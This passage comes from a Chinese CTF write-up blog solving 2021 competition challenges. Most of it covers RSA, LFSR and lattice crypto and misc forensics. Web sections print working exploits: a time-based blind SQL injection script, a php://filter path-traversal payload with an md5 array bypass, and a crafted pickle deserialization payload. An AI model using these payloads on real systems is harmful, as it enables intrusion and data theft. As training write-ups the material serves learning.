f&#x27;if((ascii(substr((select(load_file(&quot;/var/www/html/ffllaagg.php&quot;))),&#123;i&#125;,1))&gt;&#123;mid&#125;),sleep(0.6),0)&#x27; try: r = requests.get(url + payload,timeout=0.5) tail = mid except: head = mid + 1 if head != 32: result += chr(head) else: break print(result) 得到flag：nctf&#123;m1saka_wanna_marry_liyuu_&#125;。 ​ REVERSEHello せかい 欢迎来到NCTF-逆向工程(Reverse Engineering)这里可能有你需要的工具:ida pro 7.6 :链接：https://pan.baidu.com/s/1bV2HjBBX0bwwtzORqhErOg 提取码：o49x IDA打开，查找字符串，发现flag：NCTF&#123;We1come_2_Reverse_Engineering&#125;。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021赛","slug":"2021赛","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"2021年中国能源网络安全大赛","slug":"match-2021年中国能源网络安全大赛","date":"2021-10-15T11:39:32.000Z","updated":"2021-10-16T16:00:36.995Z","comments":true,"path":"2021/10/15/match-2021年中国能源网络安全大赛/","permalink":"https://lazzzaro.github.io/2021/10/15/match-2021%E5%B9%B4%E4%B8%AD%E5%9B%BD%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/","excerpt":"","text":"​ 能源网络安全是国家实施能源安全战略的重要保障。在国家“碳达峰、碳中和”战略目标引领下，以新能源为主体的新型电力系统正加快建设，能源企业数字化转型加速发展，我国能源网络安全风险挑战仍将持续增大。为深入贯彻习近平总书记关于切实做好国家关键信息基础设施安全防护的重要指示精神，落实《关键信息基础设施安全保护条例》的有关要求，全面提升我国能源行业网络安全水平，加强能源网络安全人才培养与技术交流，加快构建“清洁低碳、安全高效”的能源体系，中国能源研究会定于2021年9～11月举办2021年中国能源网络安全大赛暨中国能源网络与数据安全大会。 CRYPTORSA 123456e1=835967807536519622934604405063c1=19448632793065985668242563682199317331128016014251864412392395153156562893115782681369855239641432012330044885183775431340880864508525060098643116187637108122191428830624874050932679396567720373709957047168752779394888657259608530625932344667774681955326741127517701466048803352951916658946766088235132266647346283962586227793525978969088779182627558192227142187329292061143062946064902843366826489113664325053426251453100871248523117087970964024906746251860275872790437361291110328641349591771411040734747357045665591626240405636425026415496457159149035136648895848881873209825942855217824281430061391533815396720710n1=31046255108437029118905717148957090183329402036332840118962561815659089322022943549665387220463210707021593218518105030590365349413133234315740524564946375831281241151522645514083464163544922980295642762649110433281286369663828432475929249392310436766745697134397285170617697641192886069854519440924834245392651292279051754654969060722850419325204713884858202922636556579391101638013190488822298434718076867399175291027281809145262948338325719474386917864777538133724445628651824987863715906880390487762744557151375265257554729150403617490110959353085963322495483098493865964611448790100520199013314219751750640119863e2=885003184250422219085124964981c2=4218572471345165732934998703714571105894271274075665866974516797649450984700474173358118625328090066638656820575859730131413953210153819184549819168514892245621740892736123987170805386681559030845204022985227261362626648144331552748679698050998013623282010514985589856239604197479795560729961306447338695058204615382433558388308701652353732815262119876165416607974763600968466766575623592583217035606726939874922507643990533020940476008390177733659865545258122624949624127261940887766555348528919909233817222490816887166626563144543878852122865972078511391354912133571091812293541668653349538816840275188432483945400n2=31046255108437029118905717148957090183329402036332840118962561815659089322022943549665387220463210707021593218518105030590365349413133234315740524564946375831281241151522645514083464163544922980295642762649110433281286369663828432475929249392310436766745697134397285170617697641192886069854519440924834245392651292279051754654969060722850419325204713884858202922636556579391101638013190488822298434718076867399175291027281809145262948338325719474386917864777538133724445628651824987863715906880390487762744557151375265257554729150403617490110959353085963322495483098493865964611448790100520199013314219751750640119863 $n_1=n_2$，RSA共模攻击。 1234567891011121314151617181920212223242526272829import gmpy2 as gpdef egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)n = 31046255108437029118905717148957090183329402036332840118962561815659089322022943549665387220463210707021593218518105030590365349413133234315740524564946375831281241151522645514083464163544922980295642762649110433281286369663828432475929249392310436766745697134397285170617697641192886069854519440924834245392651292279051754654969060722850419325204713884858202922636556579391101638013190488822298434718076867399175291027281809145262948338325719474386917864777538133724445628651824987863715906880390487762744557151375265257554729150403617490110959353085963322495483098493865964611448790100520199013314219751750640119863e1 = 835967807536519622934604405063c1 = 19448632793065985668242563682199317331128016014251864412392395153156562893115782681369855239641432012330044885183775431340880864508525060098643116187637108122191428830624874050932679396567720373709957047168752779394888657259608530625932344667774681955326741127517701466048803352951916658946766088235132266647346283962586227793525978969088779182627558192227142187329292061143062946064902843366826489113664325053426251453100871248523117087970964024906746251860275872790437361291110328641349591771411040734747357045665591626240405636425026415496457159149035136648895848881873209825942855217824281430061391533815396720710e2 = 885003184250422219085124964981c2 = 4218572471345165732934998703714571105894271274075665866974516797649450984700474173358118625328090066638656820575859730131413953210153819184549819168514892245621740892736123987170805386681559030845204022985227261362626648144331552748679698050998013623282010514985589856239604197479795560729961306447338695058204615382433558388308701652353732815262119876165416607974763600968466766575623592583217035606726939874922507643990533020940476008390177733659865545258122624949624127261940887766555348528919909233817222490816887166626563144543878852122865972078511391354912133571091812293541668653349538816840275188432483945400s = egcd(e1, e2)s1 = s[1]s2 = s[2]if s1&lt;0: s1 = - s1 c1 = gp.invert(c1, n)elif s2&lt;0: s2 = - s2 c2 = gp.invert(c2, n)m = pow(c1,s1,n)*pow(c2,s2,n) % nprint(hex(m)[2:])print(bytes.fromhex(hex(m)[2:]))#666c61677b36323462306666352d326436642d313165632d623438622d6463613930343938613264627d#b&#x27;flag&#123;624b0ff5-2d6d-11ec-b48b-dca90498a2db&#125;&#x27; FLAG: flag&#123;624b0ff5-2d6d-11ec-b48b-dca90498a2db&#125; ​ Base 31332b353d3f3f3f2d2d2d2d7a6d6a74706d3838757366677a6d797474736467746d65697a6c6c74787a6d657a61646a766d6f66757365677262776b7a77666a7a61796f7a646d75373d3d3d 先转hex得到 13+5=???----zmjtpm88usfgzmyttsdgtmeizlltxzmezadjvmofusegrbwkzwfjzayozdmu7===， zmjtpm88usfgzmyttsdgtmeizlltxzmezadjvmofusegrbwkzwfjzayozdmu7=== 根据无数字1和等号特征，猜测是转小写的base32； 转回大写，由前面提示 13+5，rot13+base32得到 fladå.Ù..Å.Í.Õ.Á.ÌÅ....Èå.ÈäÝ...Õ..Éþ 出现flag头； 由于 base32(&#39;flag&#123;&#39;)=MZWGCZ33，数字为rot5，密文还原为 MZWGCZ33HFSTMZLGGFQTGZRVMYYGKMZRMNQWIZBSHFRTEOJXMJSWMNLBMQZH2===， base32 解码得 flag&#123;9e6ef1a3f5f0e31cadd29c297bef5ad2&#125;。 FLAG: flag&#123;9e6ef1a3f5f0e31cadd29c297bef5ad2&#125; ​ Flow 杂七杂八密码的混合体 123456789101112131415161718192021222324252627282930313233343536373839from Crypto.Util.number import *def lfsr(status,mask): newbit = (status &lt;&lt; 1) &amp; (2**33-1) i=(status&amp;mask)&amp;(2**33-1) lastbit=0 while i!=0: lastbit^=(i&amp;1) i=i&gt;&gt;1 newbit^=lastbit return (newbit,lastbit)status=1mask = 0b10110001110010011100100010110101m = b&quot;flag&#123;*************&#125;&quot;num = bytes_to_long(m)p = getPrime(1024)q = getPrime(1024)n = p*qe = 65537binp = bin(p)[2:]c = (pow(num, e, n))f=open(&quot;enc2&quot;, &quot;w+&quot;)f.write(str(n)+&quot;\\n&quot;)f.write(str(c)+&quot;\\n&quot;)f.close()f=open(&quot;enc&quot;,&quot;w+&quot;)for i in range(760): curnum = int(binp[i]) (status,out)=lfsr(status,mask) f.write(chr(curnum ^ out))f.close() LFSR + RSA高位p泄露攻击。 先模拟LFSR求出760组 out 01值，结合enc文件中01密文，异或还原 $p$ 的高760二进制位： 1234567891011121314151617181920212223242526def lfsr(status,mask): newbit = (status &lt;&lt; 1) &amp; (2**33-1) i=(status&amp;mask)&amp;(2**33-1) lastbit=0 while i!=0: lastbit^=(i&amp;1) i=i&gt;&gt;1 newbit^=lastbit return (newbit,lastbit)status = 1mask = 0b10110001110010011100100010110101c = list(bytes.fromhex(&#x27;00000100000001010001010101010000000000010000010001010000010100000001000000000101010100010001000000000000010001000000010000000001010000000101000000000000000001000100010001000101010001010101010101000101000101000000010001010001000000000001010001010100010001000000000000010000010001000000000000000000000000010101000000010101000100010001000100010101010101010001010000000100000100000101000101010001010101000101000001010000010001000100000001000101010100010100010000000101000001000101000001000101000100010100000100000101000100000100000100000000010000010100010001010100010000000100000001000001010000000000000001010101000101010100010100010001010101000100010101000100010001010101010001010000000101010001000100000000000101000001010001000101000001000100010101010001000001010001010001010101010001000100010101000001000001000100010000000100000001010001010000000101010000010001000000010000010100000000010001000001010100010101010101000000010100010100010101000000010001010101010001010100000001010001000101000100000000000100010100000001010101000100010100010100010000000100010101000001000001010001000100010001010001000101010101000000000000010100000001000000000001010000010100000001000100000000000000000101010101000000000000010001000100010001000001000100000101000101000101010101010001000001000101000101000000010100000001010001000100010101000001000101010100010001010100010100010000000001000001010000000001010001000001010000010000000001000101000100010001010101010101000101010101000000000000000101010001010001010100010100000000000000000100010101&#x27;))#print(c)pp = &#x27;&#x27;for i in range(760): (status,out) = lfsr(status,mask) pp += str(c[i]^out)pp = int(pp, 2)print(pp)#6064523798049644277925701126806650606472211004362096137261922023539261533931159712229993784486900304494092698035668254711607734547323493716579247168129613825017402250081444943555723771998431425098683590600454956058175183022718975 利用coppersmith攻击方法，进行已知 $p$ 高位攻击： 12345678910111213141516n = 20929902170717676951934620006433003604730678640645007075637305655990838672444304031857412581445836654784941618387885677741424195646067710979291690749949226354601059943673546892769474380805413381477209725509187761202889007557157174009816759858206190915193870770303140668513899480840368042056977078850633645939996806974754076338446182094408033833859119883893893710390855924917625801146138452249766835457952331243832878453385608344187234621288871394907683956060567710199168220435234555727645472494418988488158424284566395402382371954247354264148359024995803494283148151292240772247688313806712633140618802681063347059301p4 = 6020793003600505515657431119157212393365966944447518390323900168965824649782228689680274668164250924439790546808885513956693311045291390596152861670602514965058376230082977010070282487901715757886308848763512028412503942684262007e = 65537pbits = 1024kbits = pbits - p4.nbits()p4 = p4 &lt;&lt; kbitsPR.&lt;x&gt; = PolynomialRing(Zmod(n))f = x + p4roots = f.small_roots(X=2^kbits, beta=0.4)if roots: p = p4+int(roots[0]) print(&quot;p = &quot;+str(p)) print(&quot;q = &quot;+str(n//p)) #p = 178473011392593598505298598344099528115548451492933270114904463603611584603267214985220850730034624404463453138131960336680355670323048351300133942965805079196071421536335378530449908306426271314462228131670026772855194671868525313446301101494560326641880067330258886334198095183772143790227948133817520438209#q = 117272085047511228904591997419599628624189308881609369935452126803320898264759343424520375607941703744925707366699154133792983045245930090675456846087494137892328143697198606928970884892931890016115977464725544377659165461842270186367403846042556245975180328562734594014884754292825059517252004778580410644389 最后常规RSA解 $m$： 123456789101112import gmpy2p = 178473011392593598505298598344099528115548451492933270114904463603611584603267214985220850730034624404463453138131960336680355670323048351300133942965805079196071421536335378530449908306426271314462228131670026772855194671868525313446301101494560326641880067330258886334198095183772143790227948133817520438209q = 117272085047511228904591997419599628624189308881609369935452126803320898264759343424520375607941703744925707366699154133792983045245930090675456846087494137892328143697198606928970884892931890016115977464725544377659165461842270186367403846042556245975180328562734594014884754292825059517252004778580410644389n = p * qfn = (p-1) * (q-1)e = 65537c = 12381638589055841139447839302795029653843309313978198727914736718245700098003130043532117734105184556347388175236916768083364314767482249333410320774565764577094924964983543424785959666191716662886118558538365503080964047183533841342232120086245448689762948846598689811062301086591078119426971029385906936610191899748366808606594184238261341160458933596780268681004577561284530512291876043524269456261191856680575840859843145591670082313114482813697656520320677074240863479192424768989294287655231041605257414144367688426659163486702611196512549549115716697786311455783534600599360245502989232358699920442842821956230d = gmpy2.invert(e, fn)m = pow(c, d, n)print(bytes.fromhex(hex(m)[2:]))#b&#x27;flag&#123;th1s_ls_4_eZ_quEST1on&#125;&#x27; FLAG: flag&#123;th1s_ls_4_eZ_quEST1on&#125; ​ NumberGame 数字的游戏 12345e=65537(p-1)*(q-1)=15743369066365201538689815141217340316571238013087670610561037355773525976258683589473338312326667266426637983360891507450086948913791067841805124377899989037485326133436719169246977060981737084689604571176180431464103979969894191079926052092838806338413905561857239072404009236751128582547515118141940600672935405990869984053032765764114050729270669601890847900632843688927485888918612911073502700067125045327489296133801029104137634700096205588495179191062622618039322093662364377472003903899926787818853067801269953347284657645644433840226628368651915623156258190141632506503179281547840336415021260912890513317032c=13751833349374257546209411135285092025488474108950873335024549274321086737456294175321120539754112475192176856842163702158437261396059826784892899176923534179915888282864428402789707026830116675021571701648882970445289856088711084812757925707567230381940631064097247655097898810731114605714274641284534967275121251913986394408892187726203752249533094374744765243723455319272657285557501695073422223837888223589541537218910163081228251946239816318853757555291276404517545168694257378212616960758914005374587905274292014917325205163653897110709086078591016724234778570715311198272084303656971117931256882498414761066763invert(p,q)=63567214271914333094632899333841375147292062018298573854142802911053572390920700513290025348818998146731407276513819782906243535938082361025317768375133584131695102997533625569063205757115454077033715745425720243515047860316309615090852448819151555625882308478246810599114349379924606314715907857949899701531invert(q,p)=61854206698188431209560015384356189028981002413118973294450748821388080621667741484068895416821294105003859720045449073339567340407545907381482535347338180766054184558875014806879520058753821268699806496142714025634827191809185242495912563928024605815219672974396270176683304596115075405856328836048144151507 给出 $(p-1)(q-1),x=\\text{inv}(p,q),y=\\text{inv}(q,p),e,c$。 详细推导思路可参考 HITCON 2019 - Lost Modulus Again。 解题脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import gmpy2from itertools import productimport binasciifrom Crypto.Util.number import *&quot;&quot;&quot;alpha = p&#x27; * q&#x27; - lbeta = l^2 * [(e * d - 1) / s] + q&#x27; * l + p&#x27; * l - p&#x27; * q&#x27; - alpha - l^2i.e.:beta = l^2 * &#123;[(e * d - 1) / s] - 1&#125; + l * (q&#x27; + p&#x27;) - alpha - p&#x27; * q&#x27;if l,s are correct: alpha = k * t beta = k * (p&#x27; - l) + t * (q&#x27; - l)i.e:&quot;&quot;&quot;def alpha_from_pprime_qprime_l(pprime, qprime, l): return pprime*qprime - ldef beta_from_pprime_qprime_e_d_l_s_alpha(pprime, qprime, e, d, l, s, alpha): temp1 = e*d - 1 assert temp1 % s == 0 temp2 = ((temp1 // s) - 1) * l * l temp3 = temp2 + l * (pprime + qprime) return temp3 - alpha - (pprime*qprime)def k_t_from_pprime_qprime_l_alpha_beta(pprime, qprime, l, alpha, beta): a = pprime - l b = -beta c = alpha * (qprime - l) disc = b * b - 4 * a * c assert gmpy2.is_square(disc) temp = -b + gmpy2.isqrt(disc) assert temp % (2*a) == 0 k = temp // (2*a) assert alpha % k == 0 return k, alpha // kdef brute_k_t_l(pprime, qprime, e, d): # l, s = 2, 2 ss = [s for s in range(e - 100000, e + 1000000) if s!=0 and (e*d - 1) % s == 0] for l, s in product(range(1, 5000), ss): #print(f&#x27;l = &#123;l&#125;, s = &#123;s&#125;&#x27;) try: alpha = alpha_from_pprime_qprime_l(pprime, qprime, l) beta = beta_from_pprime_qprime_e_d_l_s_alpha(pprime, qprime, e, d, l, s, alpha) k, t = k_t_from_pprime_qprime_l_alpha_beta(pprime, qprime, l, alpha, beta) return k, t, l except AssertionError: continueif __name__ == &quot;__main__&quot;: e = 65537 fn = 15743369066365201538689815141217340316571238013087670610561037355773525976258683589473338312326667266426637983360891507450086948913791067841805124377899989037485326133436719169246977060981737084689604571176180431464103979969894191079926052092838806338413905561857239072404009236751128582547515118141940600672935405990869984053032765764114050729270669601890847900632843688927485888918612911073502700067125045327489296133801029104137634700096205588495179191062622618039322093662364377472003903899926787818853067801269953347284657645644433840226628368651915623156258190141632506503179281547840336415021260912890513317032 d = gmpy2.invert(e,fn) pprime = 63567214271914333094632899333841375147292062018298573854142802911053572390920700513290025348818998146731407276513819782906243535938082361025317768375133584131695102997533625569063205757115454077033715745425720243515047860316309615090852448819151555625882308478246810599114349379924606314715907857949899701531 qprime = 61854206698188431209560015384356189028981002413118973294450748821388080621667741484068895416821294105003859720045449073339567340407545907381482535347338180766054184558875014806879520058753821268699806496142714025634827191809185242495912563928024605815219672974396270176683304596115075405856328836048144151507 k, t, l = brute_k_t_l(pprime, qprime, e, d) lp, lq = qprime + k, pprime + t assert lp % l == 0, lq % l == 0 p, q = lp // l, lq // l assert gmpy2.invert(p, q) == pprime, gmpy2.invert(q, p) == qprime assert gmpy2.is_prime(p), gmpy2.is_prime(q) N = p*q c = 13751833349374257546209411135285092025488474108950873335024549274321086737456294175321120539754112475192176856842163702158437261396059826784892899176923534179915888282864428402789707026830116675021571701648882970445289856088711084812757925707567230381940631064097247655097898810731114605714274641284534967275121251913986394408892187726203752249533094374744765243723455319272657285557501695073422223837888223589541537218910163081228251946239816318853757555291276404517545168694257378212616960758914005374587905274292014917325205163653897110709086078591016724234778570715311198272084303656971117931256882498414761066763 flag_decoded = pow(c, d, N) print(long_to_bytes(flag_decoded)) #b&#x27;flag&#123;dP_4nd_dQ_1s_4_exc1tlng_pr0bLEm&#125;&#x27; FLAG: flag&#123;dP_4nd_dQ_1s_4_exc1tlng_pr0bLEm&#125; ​ FillTheBlank 推公式？ 123456789101112131415161718192021from Crypto.Util.number import *import gmpy2import matha = 16358502146569154805821117102055792126075384391997576813810358118942744612520734385485210209088310766263140599554175000067735671573064419087690267925715334913530155481001158890983091873663077846204509925514040559562873128373049378251801304882824014436351821387973582562165652240535121822439156888350175610414618000437008389187928342072924670546637964062394868004556705496699646429981923137500855492623070913023804420063661041841121617920375160117028363526191248710373415720637387593795136212298387121644166224488964182846517612830649792045421886212347661276446680662471149305906153415890365792363053111611744767732723b = &quot;**********&quot;d = 1004034638166310792730607806775703553124564601554345421260673flag=&quot;flag&#123;*************&#125;&quot;.encode(&quot;utf-8&quot;)m = bytes_to_long(flag)z = &quot;**********&quot;rb = gmpy2.invert(b, p) #p应为ard = gmpy2.invert(d, p) #p应为ax = rb*rdc = (m + z * rb * d % a)%aassert(x==6315659043002030386732628047413448608037014021450055783529151485037069834363316696715574624507364755209361330204858147422873261866250183596759294051863367248800298182067900158706847792801508096127972864438349393635089442050383307416911012903769591812354414290225858817653700560363386018244490076357373032578412217266586094695255045411910123500620718125148007865650934761243821251725823364164494857358344030633984045814182753879152597382860304163779884435644346012876829684180445183686922253767338719485395107909704323571278192414797079570675523716981179479127876875936828316228191746093521584500893126198631718691478)assert(c == 13596888613593355909989922489890598098147006404940300566769884949973269155719149670825677093684865700611084990815597885910353735947129944271345041538903031681298587672182524580124290627382140539264797169742520543929318842181890234622629255911624719400312152476306595541663238469772749767491911131691767357337344670678126067823905376191196367985379783363614691429132347967869598160549130755596368301366502209859435570988428790501722994265227987470237460083210385323943246674820772425514186206511159274330451656105100385024137631498256411854720506611702496670593426888793357086314109878603547497784715623917384308274129)assert(log(d)/log(2)&lt;=200)assert(log(z)/log(2)&lt;=1024) 推导： 由 $rb \\equiv b^{-1} \\pmod a$ 和 $rd \\equiv d^{-1} \\pmod a$ ，有 $rb \\cdot b \\cdot rd \\cdot d = x \\cdot b \\cdot d \\equiv 1 \\pmod a$。 故求出 $b \\equiv (x \\cdot d)^{-1} \\pmod a$，$rb \\equiv b^{-1} \\pmod a$。 又 $c = (m+z \\cdot rb \\cdot d) \\bmod a$，构造格 $L=\\begin{bmatrix} 1 &amp; rb \\cdot d \\\\ 0 &amp; a \\end{bmatrix}$，利用LLL算法求解： 123456789101112131415161718192021222324252627a = 16358502146569154805821117102055792126075384391997576813810358118942744612520734385485210209088310766263140599554175000067735671573064419087690267925715334913530155481001158890983091873663077846204509925514040559562873128373049378251801304882824014436351821387973582562165652240535121822439156888350175610414618000437008389187928342072924670546637964062394868004556705496699646429981923137500855492623070913023804420063661041841121617920375160117028363526191248710373415720637387593795136212298387121644166224488964182846517612830649792045421886212347661276446680662471149305906153415890365792363053111611744767732723d = 1004034638166310792730607806775703553124564601554345421260673x = 6315659043002030386732628047413448608037014021450055783529151485037069834363316696715574624507364755209361330204858147422873261866250183596759294051863367248800298182067900158706847792801508096127972864438349393635089442050383307416911012903769591812354414290225858817653700560363386018244490076357373032578412217266586094695255045411910123500620718125148007865650934761243821251725823364164494857358344030633984045814182753879152597382860304163779884435644346012876829684180445183686922253767338719485395107909704323571278192414797079570675523716981179479127876875936828316228191746093521584500893126198631718691478c = 13596888613593355909989922489890598098147006404940300566769884949973269155719149670825677093684865700611084990815597885910353735947129944271345041538903031681298587672182524580124290627382140539264797169742520543929318842181890234622629255911624719400312152476306595541663238469772749767491911131691767357337344670678126067823905376191196367985379783363614691429132347967869598160549130755596368301366502209859435570988428790501722994265227987470237460083210385323943246674820772425514186206511159274330451656105100385024137631498256411854720506611702496670593426888793357086314109878603547497784715623917384308274129import gmpy2b = gmpy2.invert(x*d,a)rb = gmpy2.invert(b,a)rd = gmpy2.invert(d,a)h = rb*d%ap = av1 = vector(ZZ, [1, h])v2 = vector(ZZ, [0, p])m = matrix([v1,v2]);f, g = m.LLL()[0]f, g = -f, -g#print(f, g)a = f*c % p % gm = a * inverse_mod(f, g) % gprint(bytes.fromhex(hex(m)[2:]))#b&#x27;flag&#123;we1c0mE_t0_cr4aK_mE!&#125;&#x27; FLAG: flag&#123;we1c0mE_t0_cr4aK_mE!&#125; ​ MISCcheckin flag{W3Lc0m3_t0_2o2I_3n3rgy_contest} 签到。 FLAG: flag&#123;W3Lc0m3_t0_2o2I_3n3rgy_contest&#125; ​ hardwire_1 下载附件压缩包，分析文件，找到flag。提交flag格式：flag{xxxx}。 流量包文件，wireshark打开，追踪TCP流，发现菜刀连接流量特征。 解析流1中z2参数值，base64解码得： cd /d &quot;C:\\php\\htdocs&quot;&amp;winrar a -pf@l#ag102 key.rar key.jpg&amp;echo [S]&amp;cd&amp;echo [E] 解析流3中z0参数值，base64解码转存得到Rar文件 key.rar。 结合前面的解压密码 f@l#ag102，解压得到 flag.jpg。 FLAG: flag&#123;579a4da9e3375c9b96add11cf2915eb5&#125; ​ wava Do you know what is wava? 附件move.zip无法打开，010editor查看为wav文件头，修改后缀，使用audacity打开未发现有用信息。 回到16进制下查看，发现在0x69处存在另一个wav文件头，删除前面的文件头保存，重新使用audacity打开，发现摩斯密码，手撸下来得到： ..-. .-.. .- --. ----- ....- -.. .---- -.. . -.... -.. -.... ...-- .- .- .---- -... ..... -... ..... ..... --... ...-- ..-. -.-. -.... . ----- ---.. . ...-- ----. -.... ..-. ----- 解码得flag。 FLAG: flag&#123;04d1de6d63aa1b5b5573fc6e08e396f0&#125; ​ WEBezphp 想看二次元有很多障碍(flag在/flag) 点提交按钮出现源码： 123456789101112131415161718192021222324252627282930313233343536373839&lt;?php if(!$_GET[&#x27;site&#x27;])&#123; ?&gt;&lt;html&gt; &lt;body&gt; 想看个二次元怎么这么难&lt;form action=&#x27;&#x27; method=&#x27;GET&#x27;&gt; &lt;input type=&#x27;submit&#x27; name=&#x27;submit&#x27; /&gt; &lt;input type=&#x27;text&#x27; name=&#x27;site&#x27; style=&quot;width:1000px&quot; value=&quot;https://bilibili.com/&quot;/&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; &lt;?php die(); &#125;show_source(__FILE__);if (($_GET[&#x27;user&#x27;]===$_GET[&#x27;password&#x27;])||(md5($_GET[&#x27;user&#x27;])!=md5($_GET[&#x27;password&#x27;]))) die();$url = $_GET[&#x27;site&#x27;]; $path = $_GET[&#x27;path&#x27;];$url_schema = parse_url($url); $host = $url_schema[&#x27;host&#x27;]; $request_url = $url.&quot;/v/popular/all&quot;.$path; $res = file_get_contents($request_url);if (strstr($res,&quot;flag&quot;)) die(&quot;you can&#x27;t see my flag&quot;);if($res)&#123; echo &quot;&lt;h1&gt;Source Code:&lt;/h1&gt;&quot;; echo $request_url; echo &quot;&lt;hr /&gt;&quot;; echo $res; &#125;else&#123; echo &quot;get source failed&quot;; &#125; ?&gt; 第一层，PHP md5弱比较性质绕过：user[]=1&amp;password[]=2 第二层，PHP伪协议拼接绕过关键词+目录穿越：site=php://filter/read=convert.base64-encode/resource=ss&amp;path=/../../../../../../../../../flag payload: ?submit=%E6%8F%90%E4%BA%A4&amp;site=php://filter/read=convert.base64-encode/resource=ss&amp;path=/../../../../../../../../../flag&amp;user[]=1&amp;password[]=2 得到ZmxhZ3tqWkV0NkNrRmNSOFNHbVBCTjJobDVvcjBYVzRUM251TX0K，base64解码得flag。 FLAG: flag&#123;jZEt6CkFcR8SGmPBN2hl5or0XW4T3nuM&#125; ​ EZpy pickle反序列化 加参数 ?source=1 得到源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970import base64import ioimport sysimport pickleimport bfrom flask import Flask, Response, render_template, requestapp = Flask(__name__)def read(filename, encoding=&#x27;utf-8&#x27;): with open(filename, &#x27;r&#x27;, encoding=encoding) as fin: return fin.read()class people: def __init__(self, name, sex, age): self.name = name self.sex = sex self.age=age def __repr__(self): return f&#x27;people(name=&#123;self.name!r&#125;, category=&#123;self.sex!r&#125;, age=&#123;self.age!r&#125;)&#x27; #==判断 def __eq__(self, other): return type(other) is people and self.name == other.name and self.sex == other.sex and self.age==other.ageclass RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module[0:8] == &#x27;__main__&#x27;: return getattr(sys.modules[&#x27;__main__&#x27;], name) raise pickle.UnpicklingError(&quot;global &#x27;%s.%s&#x27; is forbidden&quot; % (module, name))def here_load(s): return RestrictedUnpickler(io.BytesIO(s)).load()@app.route(&#x27;/&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])def index(): if request.args.get(&#x27;source&#x27;): return Response(read(__file__),mimetype=&#x27;text/plain&#x27;) else: return Response(&quot;/?source=&quot;)@app.route(&#x27;/app&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def inll(): if request.method == &#x27;POST&#x27;: try: pickle_data = request.form.get(&#x27;data&#x27;) if b&#x27;R&#x27; in base64.b64decode(pickle_data): return &#x27;no no no&#x27; else: result = here_load(base64.b64decode(pickle_data)) if type(result) is not people: return &#x27;？？？？&#x27; correct = (result == people(b.name, b.sex, b.age)) if correct: return Response(read(&#x27;/flag.txt&#x27;)) except Exception as e: return Response(str(e)) test = people(&#x27;test&#x27;, &#x27;test&#x27;,&#x27;55&#x27;) pickle_data = base64.b64encode(pickle.dumps(test)).decode() return Response(pickle_data)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=8000) 限制中，改写了find_class函数，只能生成__main__模块的pickle，此外，禁止了b&#39;R&#39;。 目标是覆盖 b 中的验证，由于 b 被主程序引入，是存在于__main__下的 b 模块中的，所以可以直接覆盖掉，此时就成功绕过了限制： 12345678910111213141516171819202122232425262728293031323334import ioimport sysimport pickleimport base64class people: def __init__(self, name, sex, age): self.name = name self.sex = sex self.age=age def __repr__(self): return f&#x27;people(name=&#123;self.name!r&#125;, category=&#123;self.sex!r&#125;, age=&#123;self.age!r&#125;)&#x27; def __eq__(self, other): return type(other) is people and self.name == other.name and self.sex == other.sex and self.age==other.age #print(pickle.dumps(people(&#x27;aaa&#x27;,&#x27;bbb&#x27;,&#x27;ccc&#x27;)))data=b&#x27;&#x27;&#x27;c__main__b(S&#x27;name&#x27;S&quot;aaa&quot;S&quot;sex&quot;S&quot;bbb&quot;S&quot;age&quot;S&quot;ccc&quot;db0(S&quot;aaa&quot;S&quot;bbb&quot;S&quot;ccc&quot;i__main__people.&#x27;&#x27;&#x27;print(base64.b64encode(data).decode())#Y19fbWFpbl9fCmIKKFMnbmFtZScKUyJhYWEiClMic2V4IgpTImJiYiIKUyJhZ2UiClMiY2NjIgpkYjAoUyJhYWEiClMiYmJiIgpTImNjYyIKaV9fbWFpbl9fCnBlb3BsZQou POST方式在 /app 路由传入参数 data，得到flag。 FLAG: flag&#123;2Vl49keFDTMN3frBo6HOYw0djCGzIcPQ&#125;","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021赛","slug":"2021赛","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"2021羊城杯网络安全大赛","slug":"match-2021羊城杯网络安全大赛","date":"2021-09-11T17:14:50.000Z","updated":"2021-09-11T19:04:16.364Z","comments":true,"path":"2021/09/12/match-2021羊城杯网络安全大赛/","permalink":"https://lazzzaro.github.io/2021/09/12/match-2021%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/","excerpt":"","text":"​ 大赛由中共广州市委网络安全和信息化委员会办公室作为指导单位，广州市网络安全产业促进会主办，广东外语外贸大学、深信服科技股份有限公司承办，广州市信息安全测评中心、广州互联网协会协办。 大赛以“网络安全为人民、网络安全靠人民”为主题，旨在通过竞赛的方式提高参赛选手攻防兼备的网络安全实践技能，实现以赛促学、以赛会友，加强不同院校及单位间的技术交流。 Rank: 企事业单位组12 ReverseEz_android Just an easy sign in! jadx查看MainActivity类。 onClink函数先验证username和password，在资源文件查到username为admin，加密处理后的password值为c232666f1410b3f5010dc51cec341f58，又getEncodeStr函数对password的md5结果每一byte做了减1处理，还原得到c33367701511b4f6020ec61ded352059，查到对应的原值为654321。 接下来执行getKeyAndRedirect函数，传入password值654321，进入socket交互（nc 139.224.191.201 20080），输入password，拿到key字符串： key=TGtUnkaJD0frq61uCQYw3-FxMiRvNOB/EWjgVcpKSzbs8yHZ257X9LldIeh4APom 在getKeyAndRedirect函数中最后将key传递到CheckFlagActivity，在CheckFlagActivity中checkFlag函数调用EncodeUtils类实现base64编码，key为码表，encodeFlag为编码结果： 